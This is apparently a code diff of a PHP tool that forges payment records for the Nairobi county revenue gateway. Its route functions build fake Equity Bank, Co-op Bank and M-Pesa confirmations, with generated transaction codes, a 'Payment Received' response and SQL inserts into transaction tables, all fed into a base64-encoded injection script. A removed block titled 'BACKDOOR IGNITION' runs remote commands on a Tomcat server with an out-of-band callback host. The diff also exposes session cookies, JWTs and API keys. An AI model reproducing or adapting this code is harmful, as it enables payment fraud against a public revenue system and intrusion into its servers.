@@ -253,9 +253,11 @@ if (isset($_GET['del'])) {
 
     $data = httpPost('https://kever.io/auto_process.php', ['invoiceNo' => $_POST['invoiceNo'], 'amount' => $_POST['amount']], ['Cookie: PHPSESSID=apr51tp5hki4qpk461mtt5c48e; authToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzAwMTk1NTksImV4cCI6MTczMDAyMzE1OSwidXNlcklkIjoiOTZfMSJ9.j9uGOtujf4sPgMcc54P60qc6EvyzcJhyM8bXR7gcCY4; visitorId=973ad0dd0c565ca2ae839d5ebef8447a']);
     //echo $data;
-    //die();
+
 
     $validation = json_decode($data, true);
+    // echo $validation['description'];
+    // die();
 
     $payType = $_POST['pay'];
     $postAmount = $_POST['amount'];
@@ -302,138 +304,7 @@ if (isset($_GET['del'])) {
 
 
                             //die(json_encode($url));
-
-                            function equityRoute($bypass, $validation)
-                            {
-                                $timeFormats = getCurrentTimeFormats();
-                                $bypassAmt = (float)$bypass['amount'];
-
-                                $bypass['url'] = 'https://nairobiservices.go.ke/api/gateway/taifa/nrs/affirm';
-                                //$url = 'https://nairobiservices.go.ke/api/authentication/bill/confirm_payment';
-                                $bty = explode('-', $bypass['invoice_no']);
-                                $bty[1] = strtoupper($bty[1]);
-
-                                $code2 = generateAccountNumber();
-                                $code2Date = generateCurrentDateWithMidnightTime();
-
-                                $data2 = array(
-                                    "apiKey" => "",
-                                    "type" => null,
-                                    "billNumber" => (string) $bypass['invoice_no'],
-                                    "billAmount" => number_format($bypassAmt, 1, '.', ''),
-                                    "phone" => "null",
-                                    "transactionDate" => (string) $code2Date,
-                                    "Field1" => null,
-                                    "Field2" => null,
-                                    "Field3" => null,
-                                    "Field4" => null,
-                                    "Field5" => null,
-                                    "bankdetails" => array(
-                                        "accountNumber" => (string) $code2,
-                                        "bankName" => "Equity Bank",
-                                        "debitAccount" => (string) $bypass['invoice_no'],
-                                        "debitCustName" => (string) $bypass['invoice_no'] . " " . strtoupper($validation['description']),
-                                        "bankReference" => (string) $code2,
-                                        "customerReference" => (string) $bypass['invoice_no'],
-                                        "paymentMode" => "cash"
-                                    ),
-                                    "mpesadetails" => null
-                                );
-
-                                $obj2 = array(
-                                    "success" => true,
-                                    "description" => "Payment Received Successfuly",
-                                    "customer_no" => "NULL",
-                                    "invoice_no" => (string) $bypass['invoice_no'],
-                                    "invoice_report" => "",
-                                    "balance" => number_format($bypassAmt, 1, '.', '')
-                                );
-
-
-
-                                $data2 = json_encode($data2, JSON_PRESERVE_ZERO_FRACTION);
-                                $obj2 = json_encode($obj2, JSON_PRESERVE_ZERO_FRACTION);
-
-                                //echo $data2 . '<br/><br/>';
-
-
-                                $sqldata = trim(json_encode($data2), '"');
-                                $sqlobj = trim(json_encode($obj2), '"');
-
-                                $headers = [];
-
-                                $bankTransactions = "INSERT INTO bankTransactions 
-                            ( 
-                            bankCode,  
-                            transactionRef,  
-                            amount,  
-                            acctRefNo,  
-                            accName,  
-                            description,  
-                            institutionCode,  
-                            institutionName,  
-                            status,  
-                            logDate,  
-                            transacDate,  
-                            apiCode,  
-                            mobileNumber,  
-                            transtatus,  
-                            billNumber,  
-                            tranParticular,  
-                            paymentMode,  
-                            phoneNumber,  
-                            requestoutput,  
-                            paymentChannel,  
-                            Currency,  
-                            BranchCode,  
-                            status_1,  
-                            ValidationDate,  
-                            PushedComments,  
-                            transtatus_1
-                            ) VALUES ( 
-                            '003',  
-                            '" . $code2 . "',  
-                            " . $bypass['amount'] . ",  
-                            '" . $bypass['invoice_no'] . "',  
-                            null,  
-                            null,  
-                            '" . $bypass['invoice_no'] . "',  
-                            '" . $validation['description'] . "',  
-                            null,  
-                            '" . $timeFormats['withSeparators'] . "',  
-                            '" . $code2Date . "',  
-                            '2f11db8526fb2e170219e4a68215a1b8fe907a6c',  
-                            null,  
-                            0,  
-                            '" . $bypass['invoice_no'] . "',  
-                            '" . $bypass['invoice_no'] . " " . strtoupper($validation['description']) . "',  
-                            'cash',  
-                            null,  
-                            null,  
-                            null,  
-                            null,  
-                            null,  
-                            null,  
-                            '" . $timeFormats['withSeparators'] . "',  
-                            null,  
-                            0 )";
-
-                                //echo 'Head: SQL query <br/>';
-                                //$bankTransactions = "INSERT INTO bankTransactions (  bankCode, transactionRef, amount, acctRefNo, institutionCode, institutionName, logDate, transacDate, apiCode, mobileNumber, transtatus, billNumber, tranParticular, paymentMode, ValidationDate ) VALUES (  '003', '" . $code2 . "', " . $bypass['amount'] . ", '" . $bypass['invoice_no'] . "', '" . $bypass['invoice_no'] . "', '" . $validation['description'] . "', '" . $timeFormats['withSeparators'] . "', '" . $code2Date . "', '2f11db8526fb2e170219e4a68215a1b8fe907a6c', null, 0, '" . $bypass['invoice_no'] . "', '" . $bypass['invoice_no'] . " " . strtoupper($validation['description']) . "', 'cash', '" . $timeFormats['withSeparators'] . "' )";
-
-                                //echo $bankTransactions . '<br/>' . base64_encode($data2) . '<br/><br/>';
-
-                                return ['obj' => $data2, 'sql' => $bankTransactions];
-                            }
-
-                            function coopAccNo(int $incr)
-                            {
-                                $p1 = $incr + random_int(500, 2000);
-                                $part_1 = 'S' . (string)$p1;
-                                $part_2 = date('dmY');
-                                return $part_1 . '_' . $part_2;
-                            }
-                            function coopRoute($bypass, $validation)
+                            function mpesaRoute($bypass, $validation)
                             {
                                 $timeFormats = getCurrentTimeFormats();
                                 $bypassAmt = (float)$bypass['amount'];
@@ -442,34 +313,46 @@ if (isset($_GET['del'])) {
                                 $bty = explode('-', $bypass['invoice_no']);
                                 $bty[1] = strtoupper($bty[1]);
 
-                                $inc_hold = 71230337;
-                                $code2 = coopAccNo($inc_hold);
+                                $custname = splitName($bypass['custname']);
+
+                                $code = generateMpesaCode();
+
+                                if ($bypass['custcont'] == '' || $bypass['custcont'] == null) {
+                                    $bypass['custcont'] = '0700000000';
+                                }
+
 
                                 // $data2 = array(
-                                //     "apiKey" => "qnKbnreKqcnjMaAw",
-                                //     "type" => null,
+                                //     "apiKey" => "216424b0ce94d4682ef240fd67e30daf600be171",
+                                //     "type" => "mpesa",
                                 //     "billNumber" => (string) $bypass['invoice_no'],
                                 //     "billAmount" => (float) number_format($bypassAmt, 1, '.', ''),
-                                //     "phone" => "null",
-                                //     "transactionDate" => (string) date('Y-m-d\T00:00:00'),
+                                //     "phone" => (string) $bypass['custcont'],
+                                //     "transactionDate" => "",
                                 //     "Field1" => null,
                                 //     "Field2" => null,
                                 //     "Field3" => null,
                                 //     "Field4" => null,
                                 //     "Field5" => null,
-                                //     "bankdetails" => array(
-                                //         "accountNumber" => (string) $bypass['invoice_no'],
-                                //         "bankName" => "Cooperative Bank",
-                                //         "debitAccount" => "21000335",
-                                //         "debitCustName" => $validation['description'],
-                                //         "bankReference" => (string) $code2,
-                                //         "customerReference" => "CASH ",
-                                //         "paymentMode" => "Cash"
-                                //     ),
-                                //     "mpesadetails" => null
+                                //     "bankdetails" => null,
+                                //     "mpesadetails" => array(
+                                //         "BillRefNumber" => (string) $bypass['invoice_no'],
+                                //         "BusinessShortCode" => "6060047",
+                                //         "FirstName" => (string)str_replace("'", '', $custname['first']),
+                                //         "LastName" => (string)str_replace("'", '', $custname['last']),
+                                //         "MSISDN" => "",
+                                //         "MiddleName" => (string)str_replace("'", '', $custname['middle']),
+                                //         "OrgAccountBalance" => "0.00",
+                                //         "ThirdPartyTransID" => "0",
+                                //         "TransAmount" => (float) number_format($bypassAmt, 1, '.', ''),
+                                //         "TransID" => (string) $code,
+                                //         "TransTime" => (string)$timeFormats['withoutSeparators'],
+                                //         "TransactionType" => "Pay Bill"
+                                //     )
                                 // );
 
-                                $data2 = array( "apiKey" => "qnKbnreKqcnjMaAw", "type" => null, "billNumber" => (string) $bypass['invoice_no'], "billAmount" => (float) number_format($bypassAmt, 1, '.', ''), "phone" => "null", "transactionDate" => (string) date('Y-m-d\T00:00:00'), "Field1" => null, "Field2" => null, "Field3" => null, "Field4" => null, "Field5" => null, "bankdetails" => array( "accountNumber" => (string) $bypass['invoice_no'], "bankName" => "Cooperative Bank", "debitAccount" => "21000335", "debitCustName" => $validation['description'], "bankReference" => (string) $code2, "customerReference" => "CASH ", "paymentMode" => "Cash" ), "mpesadetails" => null );
+
+                                $data2 = array("apiKey" => "216424b0ce94d4682ef240fd67e30daf600be171", "type" => "mpesa", "billNumber" => (string) $bypass['invoice_no'], "billAmount" => (float) number_format($bypassAmt, 1, '.', ''), "phone" => (string) $bypass['custcont'], "transactionDate" => "", "Field1" => null, "Field2" => null, "Field3" => null, "Field4" => null, "Field5" => null, "bankdetails" => null, "mpesadetails" => array("BillRefNumber" => (string) $bypass['invoice_no'], "BusinessShortCode" => "6060047", "FirstName" => (string)str_replace("'", '', $custname['first']), "LastName" => (string)str_replace("'", '', $custname['last']), "MSISDN" => "", "MiddleName" => (string)str_replace("'", '', $custname['middle']), "OrgAccountBalance" => "0.00", "ThirdPartyTransID" => "0", "TransAmount" => (float) number_format($bypassAmt, 1, '.', ''), "TransID" => (string) $code, "TransTime" => (string)$timeFormats['withoutSeparators'], "TransactionType" => "Pay Bill"));
 
                                 $obj2 = array(
                                     "success" => true,
@@ -480,167 +363,154 @@ if (isset($_GET['del'])) {
                                     "balance" => number_format($bypassAmt, 1, '.', '')
                                 );
 
-
-
                                 $data2 = json_encode($data2, JSON_PRESERVE_ZERO_FRACTION);
                                 $obj2 = json_encode($obj2, JSON_PRESERVE_ZERO_FRACTION);
 
                                 $sqldata = trim(json_encode($data2), '"');
 
-                            //     $bankTransactions = "INSERT INTO bankTransactions 
-                            // ( 
-                            // bankCode,  
-                            // transactionRef,  
-                            // amount,  
-                            // acctRefNo,  
-                            // accName,  
-                            // description,  
-                            // institutionCode,  
-                            // institutionName,  
-                            // status,  
-                            // logDate,  
-                            // transacDate,  
-                            // apiCode,  
-                            // mobileNumber,  
-                            // transtatus,  
-                            // billNumber,  
-                            // tranParticular,  
-                            // paymentMode,  
-                            // phoneNumber,  
-                            // requestoutput,  
-                            // paymentChannel,  
-                            // Currency,  
-                            // BranchCode,  
-                            // status_1,  
-                            // ValidationDate,  
-                            // PushedComments,  
-                            // transtatus_1
-                            // ) VALUES ( 
-                            // '001',  
-                            // '" . $code2 . "',  
-                            // '" . (string)$bypass['amount'] . ".0',  
-                            // '" . $bypass['invoice_no'] . "',  
-                            // '" . $validation['description'] . "',  
-                            // '" . $bypass['invoice_no'] . "',  
-                            // '21000335',  
-                            // '" . $validation['description'] . "',  
-                            // null,  
-                            // '" . $timeFormats['withSeparators'] . "',  
-                            // null,  
-                            // '08b87491c1b4d8ab8b3f704e45580f8b7f70de57',  
-                            // null,  
-                            // 0,  
-                            // null,  
-                            // null,  
-                            // '1',  
-                            // null,  
-                            // '" . $sqldata . "',  
-                            // '00011001',  
-                            // 'KES',  
-                            // '00011001',  
-                            // null,  
-                            // '" . $timeFormats['withSeparators'] . "',  
-                            // null,  
-                            // 0 )";
+                                if (empty($validation['description']) || $validation['description'] == '' || $validation['description'] == null) {
+                                    $validationResponse = 'SUCCESS >>>>>>STK PUSH-ENTRY-----Validated during stk push transaction';
+                                } else {
+                                    $validationResponse = 'SUCCESS >>>>>>' . $validation['description'];
+                                }
+                                // echo json_encode($validation);
+                                // exit;
 
-                            $bankTransactions = "INSERT INTO bankTransactions  (  bankCode,   transactionRef,   amount,   acctRefNo,   accName,   description,   institutionCode,   institutionName,   status,   logDate,   transacDate,   apiCode,   mobileNumber,   transtatus,   billNumber,   tranParticular,   paymentMode,   phoneNumber,   requestoutput,   paymentChannel,   Currency,   BranchCode,   status_1,   ValidationDate,   PushedComments,   transtatus_1 ) VALUES (  '001',   '" . $code2 . "',   '" . (string)$bypass['amount'] . ".0',   '" . $bypass['invoice_no'] . "',   '" . $validation['description'] . "',   '" . $bypass['invoice_no'] . "',   '21000335',   '" . $validation['description'] . "',   null,   '" . $timeFormats['withSeparators'] . "',   null,   '08b87491c1b4d8ab8b3f704e45580f8b7f70de57',   null,   0,   null,   null,   '1',   null,   '" . $sqldata . "',   '00011001',   'KES',   '00011001',   null,   '" . $timeFormats['withSeparators'] . "',   null,   0 )";
+                                //echo $data2;
+                                // $mpesaTransactions = "insert into `mpesaTransactions`  ( 
+                                // `Confirmation Response`,
+                                // `MpesaValidation`,
+                                // `PushedComments`,
+                                // `PushedToReconcile`,
+                                // `accNo`,
+                                // `amount`,
+                                // `apiCode`,
+                                // `comment`,
+                                // `cont`,
+                                // `logDate`,
+                                // `mobileno`,
+                                // `mpesaName`,
+                                // `paybillBal`,
+                                // `phone_number`,
+                                // `receiptNo`,
+                                // `resultoutput`,
+                                // `shortCode`,
+                                // `sid`,
+                                // `status`,
+                                // `transactionTime`,
+                                // `validation Response`,
+                                // `host_name`,
+                                // `host_ip`,
+                                // `remote_id`
+                                //                        ) values  ( 
+                                // NULL,
+                                // 'COMPLETED',
+                                //  NULL,
+                                // '0',
+                                // '" . $bypass['invoice_no'] . "',
+                                // " . $bypass['amount'] . ",
+                                // '2dce510f562c9ab7ce24c6fe282b4f099e8e49be',
+                                // 'Pending',
+                                // NULL,
+                                // '" . $timeFormats['withSeparators'] . "',
+                                // '" . $bypass['custcont'] . "',
+                                // '" . str_replace("'", '', $bypass['custname']) . "',
+                                // COALESCE((SELECT `paybillBal` FROM `mpesaTransactions` ORDER BY id DESC LIMIT 1), 0) + " . $bypass['amount'] . ",
+                                // '',
+                                // '" . $code . "',
+                                // '" . $sqldata . "',
+                                // '6060047',
+                                // NULL,
+                                // 0,
+                                // '" . $timeFormats['withoutSeparators'] . "',
+                                // '" . $validationResponse . "',
+                                // 'fe80::7054:5e55:9d70:83b3%2',
+                                // 'fe80::7054:5e55:9d70:83b3%2',
+                                // '10.197.136.63'
+                                //                         )";
 
-                                return ['obj' => $data2, 'sql' => $bankTransactions];
+
+
+                                // $mpesaTransactions = "insert into `mpesaTransactions`  (  `Confirmation Response`, `MpesaValidation`, `PushedComments`, `PushedToReconcile`, `accNo`, `amount`, `apiCode`, `comment`, `cont`, `logDate`, `mobileno`, `mpesaName`, `paybillBal`, `phone_number`, `receiptNo`, `resultoutput`, `shortCode`, `sid`, `status`, `transactionTime`, `validation Response`, `host_name`, `host_ip`, `remote_id` ) values  (  NULL, 'COMPLETED', NULL, '0', '" . $bypass['invoice_no'] . "', " . $bypass['amount'] . ", '2dce510f562c9ab7ce24c6fe282b4f099e8e49be', 'Pending', NULL, '" . $timeFormats['withSeparators'] . "', '" . $bypass['custcont'] . "', '" . str_replace("'", '', $bypass['custname']) . "', COALESCE((SELECT `paybillBal` FROM `mpesaTransactions` ORDER BY id DESC LIMIT 1), 0) + " . $bypass['amount'] . ", '', '" . $code . "', '" . $sqldata . "', '6060047', NULL, 0, '" . $timeFormats['withoutSeparators'] . "', '" . $validationResponse . "', 'fe80::7054:5e55:9d70:83b3%2', 'fe80::7054:5e55:9d70:83b3%2', '10.197.136.63' )";
+                                // $mpesaTransactions = "
+                                // INSERT INTO `mpesaTransactions` (
+                                //     `Confirmation Response`,
+                                //     `MpesaValidation`,
+                                //     `PushedComments`,
+                                //     `PushedToReconcile`,
+                                //     `accNo`,
+                                //     `amount`,
+                                //     `apiCode`,
+                                //     `comment`,
+                                //     `cont`,
+                                //     `logDate`,
+                                //     `mobileno`,
+                                //     `mpesaName`,
+                                //     `paybillBal`,
+                                //     `phone_number`,
+                                //     `receiptNo`,
+                                //     `resultoutput`,
+                                //     `shortCode`,
+                                //     `sid`,
+                                //     `status`,
+                                //     `transactionTime`,
+                                //     `validation Response`,
+                                //     `host_name`,
+                                //     `host_ip`,
+                                //     `remote_id`
+                                // )
+                                // SELECT 
+                                //     NULL,
+                                //     'COMPLETED',
+                                //     NULL,
+                                //     '0',
+                                //     '" . $bypass['invoice_no'] . "',
+                                //     " . $bypass['amount'] . ",
+                                //     '2dce510f562c9ab7ce24c6fe282b4f099e8e49be',
+                                //     'Pending',
+                                //     NULL,
+                                //     '" . $timeFormats['withSeparators'] . "',
+                                //     '" . $bypass['custcont'] . "',
+                                //     '" . str_replace("'", '', $bypass['custname']) . "',
+                                //     COALESCE(MAX(`paybillBal`), 0) + " . $bypass['amount'] . ",
+                                //     '',
+                                //     '" . $code . "',
+                                //     '" . $sqldata . "',
+                                //     '6060047',
+                                //     NULL,
+                                //     0,
+                                //     '" . $timeFormats['withoutSeparators'] . "',
+                                //     '" . $validationResponse . "',
+                                //     'fe80::7054:5e55:9d70:83b3%2',
+                                //     'fe80::7054:5e55:9d70:83b3%2',
+                                //     '10.197.136.63'
+                                // FROM `mpesaTransactions`;
+                                // ";
+
+                                $mpesaTransactions = " INSERT INTO `mpesaTransactions` ( `Confirmation Response`, `MpesaValidation`, `PushedComments`, `PushedToReconcile`, `accNo`, `amount`, `apiCode`, `comment`, `cont`, `logDate`, `mobileno`, `mpesaName`, `paybillBal`, `phone_number`, `receiptNo`, `resultoutput`, `shortCode`, `sid`, `status`, `transactionTime`, `validation Response`, `host_name`, `host_ip`, `remote_id` ) SELECT  NULL, 'COMPLETED', NULL, '0', '" . $bypass['invoice_no'] . "', " . $bypass['amount'] . ", '2dce510f562c9ab7ce24c6fe282b4f099e8e49be', 'Pending', NULL, '" . $timeFormats['withSeparators'] . "', '" . $bypass['custcont'] . "', '" . str_replace("'", '', $bypass['custname']) . "', COALESCE(MAX(`paybillBal`), 0) + " . $bypass['amount'] . ", '', '" . $code . "', '" . $sqldata . "', '6060047', NULL, 0, '" . $timeFormats['withoutSeparators'] . "', '" . $validationResponse . "', 'fe80::7054:5e55:9d70:83b3%2', 'fe80::7054:5e55:9d70:83b3%2', '10.197.136.63' FROM `mpesaTransactions`; ";
+                                return ['obj' => $data2, 'sql' => $mpesaTransactions];
                             }
 
                             // $Equity = equityRoute($bypass, $validation);
                             // echo 'Equity: <br/><br/>' . $Equity['obj'] . '<br/><br/><br/>' . $Equity['sql'];
 
-                            $Coop = coopRoute($bypass, $validation);
+                            //$Coop = coopRoute($bypass, $validation);
                             //echo 'Coop: <br/><br/>' . $Coop['obj'] . '<br/><br/><br/>' . $Coop['sql'];
+
+                            $Mpesa = mpesaRoute($bypass, $validation);
+                            //echo $Mpesa['sql'];
+                            //echo 'Coop: <br/><br/>' . $Coop['obj'] . '<br/><br/><br/>' . $Coop['sql'];
+
 
                             //echo $bankTransactions ;
 
                             //echo universal_dab($bankTransactions, 'bankTransactions') . '<br/><br/>';
-                            $mod = str_replace("--SQLQUERY--", $Coop['sql'], base64_decode(ms_script()));
+                            $mod = str_replace("--SQLQUERY--", $Mpesa['sql'], base64_decode(ms_script()));
+                            $mod = str_replace("--JSONQUERY--", $Mpesa['obj'], $mod);
 
-                            // $mod = str_replace("XXBNXX", $bypass['invoice_no'], base64_decode(ms_script()));
-                             $mod = str_replace("--JSONQUERY--", $Coop['obj'], $mod);
-                            // $mod = str_replace("XXARXX", $bypass['invoice_no'], $mod);
-                            // $mod = str_replace("XXTRXX", $code2, $mod);
-                            // $mod = str_replace("XXTPXX", $bypass['invoice_no'] . " " . strtoupper($validation['description']), $mod);
-                            // $mod = str_replace("XXTDXX", $code2Date, $mod);
-                            // $mod = str_replace("'XXMNXX'", "null", $mod);
-                            // $mod = str_replace("XXICXX", $bypass['invoice_no'], $mod);
-                            // $mod = str_replace("XXACXX", "2f11db8526fb2e170219e4a68215a1b8fe907a6c", $mod);
-                            // $mod = str_replace("XXINXX", $validation['description'], $mod);
                             echo $mod;
 
-
-                            // echo 'Head: Deepwood Insertion <br/>';
-                            // $base64_encoded_content = base64_encode($mod);
-                            // $stmt = $connDeep->prepare("INSERT INTO upgw (code) VALUES (:code)");
-                            // $stmt->bindParam(':code', $base64_encoded_content);
-                            // $stmt->execute();
-
-                            // $idDeep = $connDeep->lastInsertId();
-
-                            // echo json_encode(['id' => $idDeep]) . '<br/><br/>';
                             die();
-                            ////////////////////////////// BACKDOOR IGNITION
-                            // $backdoor_res = cmd2();
-                            // $errCall = false;
-                            // //////////////////////////////////////////////////////
-                            // if (strpos($backdoor_res, 'java.lang.ClassCastException') !== false) {
-                            //     // Word found
-                            //     //*
-                            //     $url = 'https://kever.io/recon_process.php';
-                            //     $payload = ['payload' => base64_encode($data2)];
-                            //     //echo messenger($url, $headers, $payload, $method) . '<br/><br/>';
-                            //     $recon = httpPost($url, $payload);
-                            //     echo 'Head: Recon 1 Affrim <br/>';
-                            //     echo $recon . '<br/><br/>';
-                            //     //*/
-
-
-                            // } else {
-                            //     $cmd = "python3 opt/tomcat/webapps/aggregate/master.py";
-                            //     $receiver = 'https://qwnsltptvboodttriviyu0ocgxmp0z228.oast.fun';
-                            //     $receiver = urlencode($receiver);
-
-                            //     $backdoor_res2 = cmd($cmd, $receiver);
-
-                            //     if (strpos($backdoor_res2, 'java.lang.ClassCastException') !== false) {
-                            //         // Word found
-                            //         //*
-                            //         $url = 'https://kever.io/recon_process.php';
-                            //         $payload = ['payload' => base64_encode($data2)];
-                            //         //echo messenger($url, $headers, $payload, $method) . '<br/><br/>';
-                            //         $recon = httpPost($url, $payload);
-                            //         echo 'Head: Recon 2 Affrim <br/>';
-                            //         echo $recon . '<br/><br/>';
-                            //         //*/
-
-
-                            //     } else {
-                            //         $errCall = true;
-                            //     }
-                            // }
-
-                            // if ($errCall) {
-                            //     die('Command Lines Failed!!!');
-                            // } else {
-                            //     echo 'Head: Deepwoods Clearance <br/>';
-                            //     $stmt = $connDeep->prepare("SELECT * FROM upgw WHERE id=:id");
-                            //     $stmt->execute(['id' => $idDeep]);
-                            //     $result = $stmt->fetch();
-                            //     echo base64_decode($result['result']) . '<br/><br/>';
-
-                            //     $stmt = $connDeep->prepare("DELETE FROM upgw WHERE id=:id");
-                            //     $stmt->execute(['id' => $idDeep]);
-
-                            //     echo recLog($bypass['invoice_no'], $data2, $bankTransactions) . '<br/><br/>';
-                            // }
-
-
-
-                            //echo bankTransactions_del(162618);
-                            //echo transactions(8329712);
                         }
                     }
                 }
